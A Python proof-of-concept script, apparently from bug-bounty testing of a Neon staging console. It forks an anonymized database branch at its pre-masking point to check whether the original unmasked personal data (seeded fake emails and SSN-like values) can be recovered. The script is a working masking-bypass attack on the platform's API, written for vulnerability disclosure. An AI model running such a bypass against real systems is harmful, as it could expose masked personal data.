# -*- coding: utf-8 -*-
"""ANON × PITR-FORK chain: fork an anonymized branch at parent_lsn == its
fork point (pre-mask). restricted_actions blocks reset/restore but NOT fork.
If fork-at-pre-mask-lsn returns ORIGINAL data -> masking bypass.
"""
import json
import time
import ssl
import http.client
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _pg import connect, query, exec_

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
LOG = r"F:\scan\neon_report\_u8_out.txt"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]


def call(method, path, body=None, timeout=90):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + APIKEY)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, API_BASE + path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


def out(s):
    print(s, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(s + "\n")


def pw_of(bid):
    st, d = call("GET", "/projects/%s/connection_uri?database_name=neondb&role_name=neondb_owner&branch_id=%s" % (PA, bid))
    if st != 200:
        return None
    from urllib.parse import urlsplit
    u = urlsplit(json.loads(d)["uri"])
    return u.hostname, u.username, u.password


def connect_wait(bid, tries=20, wait=5):
    hp = pw_of(bid)
    if not hp:
        return None
    for i in range(tries):
        try:
            return connect(*hp)
        except Exception as e:
            out("    wait %d: %s" % (i, str(e)[:90]))
            time.sleep(wait)
    return None


def cleanup(names):
    st, d = call("GET", "/projects/%s/branches" % PA)
    for b in json.loads(d).get("branches", []):
        if b.get("name", "") in names:
            call("DELETE", "/projects/%s/branches/%s" % (PA, b["id"]))
            out("cleaned %s" % b["name"])
    time.sleep(2)


cleanup({"u8-src", "u8-anon", "u8-fork0", "u8-fork1"})

# 1. src
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u8-src", "parent_id": PAMAIN},
              "endpoints": [{"type": "read_write"}]})
SRC = json.loads(d)["branch"]["id"]
out("src=%s" % SRC)
conn = connect_wait(SRC)
time.sleep(2)
exec_(conn, "create table u8_pii(id int, email text, secret text)")
exec_(conn, "insert into u8_pii values (1,'alice.real@victimcorp.com','ssn-111-22-3333'),(2,'bob.ceo@victimcorp.com','ssn-444-55-6666')")
out("src rows: %s" % repr(query(conn, "select * from u8_pii")))
conn.close()

# 2. anon fork from src
st, d = call("POST", "/projects/%s/branch_anonymized" % PA, {
    "branch_create": {"branch": {"name": "u8-anon", "parent_id": SRC},
                      "endpoints": [{"type": "read_write"}]},
    "masking_rules": [{
        "database_name": "neondb", "schema_name": "public",
        "table_name": "u8_pii", "column_name": "email",
        "masking_function": "anon.fake_email()"
    }],
    "start_anonymization": True,
})
j = json.loads(d)
ANON = j["branch"]["id"]
ANON_PARENT_LSN = j["branch"].get("parent_lsn")
ANON_CREATED = j["branch"].get("created_at")
out("anon=%s parent_lsn=%s created=%s" % (ANON, ANON_PARENT_LSN, ANON_CREATED))
time.sleep(8)
conn2 = connect_wait(ANON)
out("anon rows: %s" % repr(query(conn2, "select * from u8_pii")))

# when did anonymization actually run? get last_run started_at
st, d = call("GET", "/projects/%s/branches/%s/anonymized_status" % (PA, ANON))
stt = json.loads(d)
run_start = stt.get("last_run", {}).get("started_at")
out("anon status: state=%s last_run_start=%s" % (stt.get("state"), run_start))
# current LSN on anon
r = query(conn2, "select pg_current_wal_lsn()::text, pg_current_wal_insert_lsn()::text")
out("anon current lsn: %s" % repr(r))
conn2.close()

# 3. fork anon at parent_lsn == anon fork point (pre-mask data should be there)
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u8-fork0", "parent_id": ANON,
                         "parent_lsn": ANON_PARENT_LSN},
              "endpoints": [{"type": "read_write"}]})
out("fork0(at parent_lsn) create: %s %s" % (st, d[:400]))
F0 = None
try:
    F0 = json.loads(d)["branch"]["id"]
except Exception:
    pass
if F0:
    conn3 = connect_wait(F0, tries=25, wait=6)
    if conn3:
        out("fork0 rows: %s" % repr(query(conn3, "select * from u8_pii")))
        conn3.close()
    call("DELETE", "/projects/%s/branches/%s" % (PA, F0))
    out("fork0 cleaned")

# 4. fork anon at a LSN right after creation but maybe before mask commit
# use created_at timestamp variant
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u8-fork1", "parent_id": ANON,
                         "parent_timestamp": ANON_CREATED},
              "endpoints": [{"type": "read_write"}]})
out("fork1(at created_at) create: %s %s" % (st, d[:400]))
F1 = None
try:
    F1 = json.loads(d)["branch"]["id"]
except Exception:
    pass
if F1:
    conn4 = connect_wait(F1, tries=25, wait=6)
    if conn4:
        out("fork1 rows: %s" % repr(query(conn4, "select * from u8_pii")))
        conn4.close()
    call("DELETE", "/projects/%s/branches/%s" % (PA, F1))
    out("fork1 cleaned")

# cleanup
for bid, tag in ((ANON, "u8-anon"), (SRC, "u8-src")):
    call("DELETE", "/projects/%s/branches/%s" % (PA, bid))
    out("cleanup %s" % tag)
print("== DONE", flush=True)
